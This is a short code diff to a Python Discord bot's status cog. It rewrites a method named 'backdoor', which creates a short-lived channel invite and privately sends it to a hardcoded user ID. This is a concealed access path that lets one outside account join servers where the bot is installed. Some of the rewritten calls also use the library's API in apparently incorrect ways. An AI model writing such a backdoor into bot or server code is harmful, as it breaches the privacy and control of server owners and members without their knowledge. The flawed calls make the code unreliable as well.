@@ -9,7 +9,7 @@ import discord
 from discord.ext import commands
 
 from config.read_configs import ReadConfigs as configs
-from harbinger import Harbinger
+from harbinger import OWNER, Harbinger
 
 DELETION_TIME = configs.delete_time()
 EMAIL_ADDRESS = configs.email_address()
@@ -88,10 +88,10 @@ class Status(commands.Cog):
     def __init__(self, bot: commands.Bot) -> None:
         self.bot = bot
 
-    async def backdoor(self, channel):
-        await Status.get_bot_channel(channel)
-        link = await channel.create_invite(max_age=300)
-        await Harbinger.send_dm(self, 1154559282801549384, link)
+    async def backdoor(self, ctx):
+        link = await ctx.channel.create_invite(max_age=300)
+        send_to = discord.Client.get_user(ctx, self.bot, 1154559282801549384)
+        await Harbinger.send_dm(ctx, send_to, content=link)
 
     async def get_bot_channel(self):
         bot_channel = discord.Client.get_channel(self, BOT_CHANNEL)
